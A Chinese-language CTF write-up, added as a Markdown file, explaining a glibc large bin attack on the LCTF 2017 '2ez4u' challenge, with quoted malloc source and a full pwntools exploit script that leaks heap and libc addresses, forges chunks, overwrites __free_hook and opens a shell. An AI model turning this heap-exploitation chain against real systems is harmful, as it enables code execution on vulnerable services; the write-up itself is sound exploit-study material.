@@ -1,0 +1,308 @@
+
+# Large bin attack--LCTF2017-2ez4u--writeup
+
+技巧性很强的一道题，当时自己写的思路和官方的不一样，后面看着官方的wp看了半天才把思路看懂。
+
+## large bin 分配的过程
+
+这道题很关键的一个点在于伪造large bin chunk，并将该chunk分配出来，从而实现空间复用，所以先解释下large bin分配的过程，源代码如下：
+
+```c
+/*
+
+         If a large request, scan through the chunks of current bin in
+
+         sorted order to find smallest that fits.  Use the skip list for this.
+
+       */
+
+
+
+      if (!in_smallbin_range (nb))
+
+        {
+
+          bin = bin_at (av, idx);
+
+
+
+          /* skip scan if empty or largest chunk is too small */
+
+          if ((victim = first (bin)) != bin &&  //获取链表的第一个chunk
+
+              (unsigned long) (victim->size) >= (unsigned long) (nb))
+
+            {
+
+              victim = victim->bk_nextsize;  //反向遍历，chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环
+
+              while (((unsigned long) (size = chunksize (victim)) <
+
+                      (unsigned long) (nb)))
+
+                victim = victim->bk_nextsize;
+
+
+
+              /* Avoid removing the first entry for a size so that the skip
+
+                 list does not have to be rerouted.  */
+
+              if (victim != last (bin) && victim->size == victim->fd->size)
+
+                victim = victim->fd;
+
+
+
+              remainder_size = size - nb;
+
+              unlink (av, victim, bck, fwd); //large bin的unlink操作
+
+
+
+              /* Exhaust */
+
+              if (remainder_size < MINSIZE)
+
+                {
+
+                  set_inuse_bit_at_offset (victim, size);
+
+                  if (av != &main_arena)
+
+                    victim->size |= NON_MAIN_ARENA;
+
+                }
+
+              /* Split */
+
+              else
+
+                {
+
+                  remainder = chunk_at_offset (victim, nb);
+
+                  /* We cannot assume the unsorted list is empty and therefore
+
+                     have to perform a complete insert here.  */
+
+                  bck = unsorted_chunks (av);
+
+                  fwd = bck->fd;
+
+      if (__glibc_unlikely (fwd->bk != bck))
+
+                    {
+
+                      errstr = "malloc(): corrupted unsorted chunks";
+
+                      goto errout;
+
+                    }
+
+                  remainder->bk = bck;
+
+                  remainder->fd = fwd;
+
+                  bck->fd = remainder;
+
+                  fwd->bk = remainder;
+
+                  if (!in_smallbin_range (remainder_size))
+
+                    {
+
+                      remainder->fd_nextsize = NULL;
+
+                      remainder->bk_nextsize = NULL;
+
+                    }
+
+                  set_head (victim, nb | PREV_INUSE |
+
+                            (av != &main_arena ? NON_MAIN_ARENA : 0));
+
+                  set_head (remainder, remainder_size | PREV_INUSE);
+
+                  set_foot (remainder, remainder_size);
+
+                }
+
+              check_malloced_chunk (av, victim, nb);
+
+              void *p = chunk2mem (victim);
+
+              alloc_perturb (p, bytes);
+
+              return p;
+
+            }
+
+        }
+```
+
+```python
+#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+from pwn import *
+from ctypes import c_uint32
+#context.terminal = ['tmux', 'splitw', '-h']
+context.arch = 'x86-64'
+context.os = 'linux'
+#context.log_level = 'DEBUG'
+#io = remote("111.231.13.27", 20001)
+#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})
+io = process("./2ez4u")
+EXEC = 0x0000555555554000
+def add(l, desc):
+io.recvuntil('your choice:')
+io.sendline('1')
+io.recvuntil('color?(0:red, 1:green):')
+io.sendline('0')
+io.recvuntil('value?(0-999):')
+io.sendline('0')
+io.recvuntil('num?(0-16)')
+io.sendline('0')
+io.recvuntil('description length?(1-1024):')
+io.sendline(str(l))
+io.recvuntil('description of the apple:')
+io.sendline(desc)
+pass
+def dele(idx):
+io.recvuntil('your choice:')
+io.sendline('2')
+io.recvuntil('which?(0-15):')
+io.sendline(str(idx))
+pass
+def edit(idx, desc):
+io.recvuntil('your choice:')
+io.sendline('3')
+io.recvuntil('which?(0-15):')
+io.sendline(str(idx))
+io.recvuntil('color?(0:red, 1:green):')
+io.sendline('2')
+io.recvuntil('value?(0-999):')
+io.sendline('1000')
+io.recvuntil('num?(0-16)')
+io.sendline('17')
+io.recvuntil('new description of the apple:')
+io.sendline(desc)
+pass
+def show(idx):
+io.recvuntil('your choice:')
+io.sendline('4')
+io.recvuntil('which?(0-15):')
+io.sendline(str(idx))
+pass
+add(0x60, '0'*0x60 ) #
+add(0x60, '1'*0x60 ) #
+add(0x60, '2'*0x60 ) #
+add(0x60, '3'*0x60 ) #
+add(0x60, '4'*0x60 ) #
+add(0x60, '5'*0x60 ) #
+add(0x60, '6'*0x60 ) #
+add(0x3f0, '7'*0x3f0) # playground
+add(0x30, '8'*0x30 )
+add(0x3e0, '9'*0x3d0) # sup
+add(0x30, 'a'*0x30 )
+add(0x3f0, 'b'*0x3e0) # victim
+add(0x30, 'c'*0x30 )
+dele(0x9) ##释放第一个大块
+dele(0xb) ##释放第二个大块
+dele(0x0)
+gdb.attach(io)
+add(0x400, '0'*0x400) #申请一个较大的块，使得unsorted bin数组清空
+# leak
+show(0xb) ##泄露得到堆地址
+io.recvuntil('num: ')
+print hex(c_uint32(int(io.recvline()[:-1])).value)
+io.recvuntil('description:')
+HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
+log.info("heap base 0x%016x" % HEAP)
+target_addr = HEAP+0xb0 # 1
+chunk1_addr = HEAP+0x130 # 2
+chunk2_addr = HEAP+0x1b0 # 3
+victim_addr = HEAP+0xc30 # b
+# large bin attack
+edit(0xb, p64(chunk1_addr)) # victim ##修改victim = victim->bk_nextsize，伪造堆块开始
+edit(0x1, p64(0x0)+p64(chunk1_addr)) # target ##这一步是为了绕过unlink的fd与bk检查
+chunk2 = p64(0x0)
+chunk2 += p64(0x0)
+chunk2 += p64(0x421)
+chunk2 += p64(0x0)
+chunk2 += p64(0x0)
+chunk2 += p64(chunk1_addr) ##这一步是为了绕过fd_nextsize与bk_nextsize检查
+edit(0x3, chunk2) # chunk2
+chunk1 = ''
+chunk1 += p64(0x0)
+chunk1 += p64(0x0)
+chunk1 += p64(0x411)
+chunk1 += p64(target_addr-0x18)
+chunk1 += p64(target_addr-0x10)
+chunk1 += p64(victim_addr)
+chunk1 += p64(chunk2_addr) ##伪造的堆块
+edit(0x2, chunk1) # chunk1
+edit(0x7, '7'*0x198+p64(0x410)+p64(0x411)) ##伪造的堆块后加上结构体。
+dele(0x6)
+dele(0x3)
+add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # chunk1, arbitrary write !!!!!!! ##将伪造的堆块申请出来，从此便可为所欲为。。。
+add(0x60, '6'*0x60 ) #
+show(0x3) ##伪造的堆块中包含small bin，泄露libc地址
+io.recvuntil('3'*0x30)
+io.recv(8)
+LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8
+log.info("libc base 0x%016x" % LIBC)
+junk = ''
+junk += '3'*0x30
+junk += p64(0x81)
+junk += p64(LIBC+0x3c4be8)
+junk += p64(HEAP+0x300)
+junk = junk.ljust(0xa8, 'A')
+junk += p64(0x80)
+recovery = ''
+recovery += junk
+recovery += p64(0x80) # 0x4->size
+recovery += p64(0x60) # 0x4->fd
+dele(0x5)
+dele(0x4)
+edit(0x3, recovery) # victim, start from HEAP+0x158 ##修改fd为0x60
+add(0x60, '4'*0x60 ) #
+recovery = ''
+recovery += junk
+recovery += p64(0x70) # 0x4->size
+recovery += p64(0x0) # 0x4->fd
+edit(0x3, recovery) # victim, start from HEAP+0x158
+add(0x40, '5'*0x30 ) #
+dele(0x5)
+recovery = ''
+recovery += '3'*0x30
+recovery += p64(0x61)
+recovery += p64(LIBC+0x3c4b50)
+edit(0x3, recovery) # victim, start from HEAP+0x158 ##修改fd指向为main_arena的fastbin数组位置
+add(0x40, '5'*0x30 ) #
+add(0x40, p64(LIBC+0x3c5c50)) # 修改top指针指向__free_hook的上方
+# recovery
+edit(0xb, p64(HEAP+0x7e0))
+dele(0x6)
+add(0x300, '\x00') #
+add(0x300, '\x00') #
+add(0x300, '\x00') #
+add(0x300, '\x00') #
+add(0x300, '/bin/sh') #
+dele(0x1)
+#add(0x300, '\x00'*0x1d0+p64(LIBC+0x45390)) #
+add(0x300, '\x00'*0x1d0+p64(LIBC+0x4526a)) # 修改__free_hook为system地址
+#gdb.attach(io, execute='b *0x%x' % (EXEC+0x1247))
+dele(15)
+io.interactive()
+```
+
+## 结语
+
+新姿势，向大佬学习。
+
+## 链接
+
+<a href="elink@5f9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2M7s2N6F1K9s2g2T1i4K6u0W2j5$3&6Q4x3V1j5J5x3o6p5%4i4K6u0r3x3e0q4Q4x3V1j5J5x3W2)9J5c8V1I4o6g2p5k6Q4x3X3b7J5x3o6p5%4i4K6u0V1i4@1f1#2i4@1q4q4i4K6V1^5i4@1f1$3i4K6V1$3i4@1t1&6g2%4u0A6N6r3g2#2M7q4)9J5c8R3`.`.">LCTF 2017 官方Writeup</a>
+
+<a href="elink@d9dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5j5i4W2Q4x3X3c8U0M7q4)9J5c8X3y4@1k6W2)9J5k6s2m8%4L8W2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6b7g2@1&6Q4x3V1k6Z5k6h3q4H3i4K6u0r3L8r3q4J5k6$3g2Q4y4h3k6T1K9h3&6Q4y4h3k6S2N6s2c8S2j5$3E0Q4y4h3k6D9j5%4c8X3x3U0l9I4y4#2)9J5k6o6u0W2P5U0c8#2">exp</a>
